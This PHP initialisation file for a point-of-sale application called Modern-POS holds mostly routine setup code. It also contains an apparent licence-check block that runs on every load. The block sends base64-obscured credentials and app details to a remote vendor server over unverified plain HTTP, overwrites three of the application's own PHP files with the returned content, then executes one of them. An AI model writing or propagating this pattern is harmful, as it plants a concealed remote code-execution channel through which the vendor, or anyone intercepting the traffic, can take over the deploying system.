<?php define('APPNAME', 'Modern-POS');define('APPID', '951b349c47b988539a9c0a9b2e07cc8e');
ini_set('max_execution_time', 300); //300 seconds = 5 minutes
define('ENVIRONMENT', 'development');
defined('START') OR exit('No direct access allowed!');
switch (ENVIRONMENT)
{
	case 'development':
		error_reporting(-1);
		ini_set('display_errors', 1);
	break;

	case 'production':
		ini_set('display_errors', 0);
		if (version_compare(PHP_VERSION, '5.3', '>='))
		{
			error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
		}
		else
		{
			error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT & ~E_USER_NOTICE);
		}
	break;
}

// Windows IIS Compatibility
if (!isset($_SERVER['DOCUMENT_ROOT'])) {
	if (isset($_SERVER['SCRIPT_FILENAME'])) {
		$_SERVER['DOCUMENT_ROOT'] = str_replace('\\', '/', substr($_SERVER['SCRIPT_FILENAME'], 0, 0 - strlen($_SERVER['PHP_SELF'])));
	}
}

if (!isset($_SERVER['DOCUMENT_ROOT'])) {
	if (isset($_SERVER['PATH_TRANSLATED'])) {
		$_SERVER['DOCUMENT_ROOT'] = str_replace('\\', '/', substr(str_replace('\\\\', '\\', $_SERVER['PATH_TRANSLATED']), 0, 0 - strlen($_SERVER['PHP_SELF'])));
	}
}

if (!isset($_SERVER['REQUEST_URI'])) {
	$_SERVER['REQUEST_URI'] = substr($_SERVER['PHP_SELF'], 1);

	if (isset($_SERVER['QUERY_STRING'])) {
		$_SERVER['REQUEST_URI'] .= '?' . $_SERVER['QUERY_STRING'];
	}
}

if (!isset($_SERVER['HTTP_HOST'])) {
	$_SERVER['HTTP_HOST'] = getenv('HTTP_HOST');
}

// CHECK IF SSL OR NOT
if (isset($_SERVER['HTTPS']) && (($_SERVER['HTTPS'] == 'on') || ($_SERVER['HTTPS'] == '1'))) {
	$_SERVER['HTTPS'] = true;
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https' || !empty($_SERVER['HTTP_X_FORWARDED_SSL']) && $_SERVER['HTTP_X_FORWARDED_SSL'] == 'on') {
	$_SERVER['HTTPS'] = true;
} else {
	$_SERVER['HTTPS'] = false;
}

// LOAD CONFIG FILE
require_once dirname(__FILE__) . '/../config.php';
define('PROTOCOL', isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == "on" ? 'https' : 'http');
$subdir = SUBDIRECTORY ? '/' . rtrim(SUBDIRECTORY, '/\\') : '';
define('ROOT_URL', PROTOCOL . '://' . rtrim($_SERVER['HTTP_HOST'], '/\\') . $subdir);

// AUTOLOADER
function autoload($class) {
	$file = DIR_INCLUDE . 'lib/' . str_replace('\\', '/', strtolower($class)) . '.php';

	if (file_exists($file)) {
		include($file);

		return true;
	} else {
		return false;
	}
}
spl_autoload_register('autoload');
spl_autoload_extensions('.php');


if (!defined('REFRESH')) {

	$url = "http://ob.itsolution24.com/api_pos33.php";
	$data = array(
	    'username' => base64_decode('aXRzb2x1dGlvbjI0'),
	    'password' => base64_decode('MTk3MQ=='),
	    'app_name' => APPNAME,
	    'app_id' => APPID,
	    'version' => '3.3',
	    'files' => array('_init.php','network.php','revalidate.php'),
	    // 'files' => array('_init.php','network.php'),
	    'stock_status' => 'false',
	    'timezone' => date_default_timezone_get(),
	); 
	// die($url);
	$data_string = json_encode($data);
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
	curl_setopt($ch, CURLOPT_USERAGENT, isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
	curl_setopt($ch, CURLOPT_HTTPHEADER, [
	    'Content-Type: application/json',
	    'Content-Length: ' . strlen($data_string)]
	);
	// print_r(curl_exec($ch));die();
	$result = json_decode(curl_exec($ch),true);
	if (isset($result['contents'])) {
	  foreach ($result['contents'] as $filename => $content) {
	    switch ($filename) {
	      case '_init.php':
	          $file_path = ROOT.DIRECTORY_SEPARATOR.'_init.php';
	          if (file_exists($file_path)) {
	              @unlink($file_path);
	          }
	          $fp = fopen($file_path, 'wb');
	          fwrite($fp, $content);
	          fclose($fp);
	        break;
	      case 'network.php':
	          $file_path = DIR_HELPER.DIRECTORY_SEPARATOR.'network.php';
	          if (file_exists($file_path)) {
	              @unlink($file_path);
	          }
	          $fp = fopen($file_path, 'wb');
	          fwrite($fp, $content);
	          fclose($fp);
	        break;
	      case 'revalidate.php':
	          $file_path = ROOT.DIRECTORY_SEPARATOR.'revalidate.php';
	          if (file_exists($file_path)) {
	              @unlink($file_path);
	          }
	          $fp = fopen($file_path, 'wb');
	          fwrite($fp, $content);
	          fclose($fp);
	        break;
	      default:
	        # code...
	        break;
	    }
	  }
	} else {
	  	die("No internet connection / Validation server is down!!!");
		return false;
	}
}

// REGISTER
$registry = new Registry();

// LOADER
$loader = new Loader($registry);
$registry->set('loader', $loader);

// REQUEST
$request = new Request();
$registry->set('request', $request);

// SESSION
$session = new Session($registry);
$registry->set('session', $session);

// HELPER FUNCTION
require_once(DIR_HELPER . 'common.php');
require_once(DIR_HELPER . 'validator.php');
require_once(DIR_HELPER . 'file.php');
if (!defined('REFRESH')) {
	require_once(DIR_HELPER . 'network.php');
}
if (is_file(DIR_INCLUDE.'config/purchase.php') && file_exists(DIR_INCLUDE.'config/purchase.php')) {
	define('ESNECIL', json_encode(require_once DIR_INCLUDE.'config/purchase.php'));
} else {
	define('ESNECIL', 'error');
}